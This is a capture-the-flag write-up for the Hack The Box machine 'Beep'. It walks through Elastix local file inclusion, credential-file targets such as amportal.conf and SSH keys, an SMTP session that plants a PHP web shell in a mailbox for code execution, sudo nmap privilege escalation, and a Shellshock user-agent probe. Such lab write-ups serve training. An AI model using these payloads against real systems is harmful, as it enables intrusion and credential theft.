# Beep - Writeup


First run the following nmap command:
**nmap -sC -sV -oA nmap 10.10.10.7**

Then you have to enumerate different dirs on the website. Use Gobuster. Turn off recursion. 
Always check x.x.x.x/help for backup instructions. 
You can also download a logo and run exiftool on it to see if you can get date or version.

Use searchsploit on the webserver for this instance it is elastix. 
In this search you will see that the search returns like 5 results. 
You can use the LFI to see files that the webserver has access to. 
Copy the lfi string and try to use it in burpsuite.

Interesting LFI payloads:
/etc/passwd (When you find the users home dir. Look for the keys!)
/etc/amportal.conf (This page contains passwords. The one that is most commonly used in that 
page is a root password for ssh root@10.10.10.7).
/etc/pam.d
/etc/fail2ban/fail2ban.conf
/proc/self/status (Here you can find information about the running user, the uid which you can use to 
get the exact user in the /etc/passwd. When you find the users home dir. Look for the keys!)
/var/lib/asterisk/.sshd/id_rsa
logfiles
/var/lib/asterisk/.bash_history  

Cool commands:
**grep -r “pattern” - greps recursively in the directories in files.**

Sending a manual mail using telnet:
telnet 10.10.10.7 25
Wait for the server to answer.
EHLO hascobot.beep.htb
*response is list of commands*
VRFY asterisk@localhost
response: 252 2.0.0 asterisk@localhost
mail from:pwned@haha.io
response: 250 2.1.0 OK
rcpt to: asterisk@localhost
response: 250 2.1.5 OK
data
response: 354 End data with <CR><LF>.<CR><LF>
Subject: You got owned
<? php echo system($_REQUEST['pwn']); ?>

.
response: 250 2.0.0 OK: queued as XXXXXXXXXXXX

If you have LFI the above mail can be used to get code execution. 
Locate the mail above in the file system and send it commands!

LFI payload: /var/mail/asterisk and then adding **&ipp=”command”** like command = whoami.
Can be used to create reverse shell.

sudo -l to see sudo programs, in this case you will see nmap and that is setuid root so jackpot.

Another way to exploit is to use another searchsploit exploit on beep. Using the search with elastix. 
This is the FreePBX exploit. You need an extension for this exploit to work. 
You can get this extension by using **svwar -m INVITE -e1-240 10.10.10.7**. 
Which will send invite to the extension range if you get a reqauth then you know it is a valid extension. 
Other than that you can also find the extension by utilizing the page called panel. See gobuster.

Third way to exploit this machine is by using the shellshock exploit!

Shellshock is usually exploitable if the webserver uses cgi. It is easy to probe for using burpsuite. 
Simply change the useragent to the following payload: () { :; }; sleep 10. 
Try sleep 10 and sleep 1 if you notice a sizable time then you can send the reverse shell. 






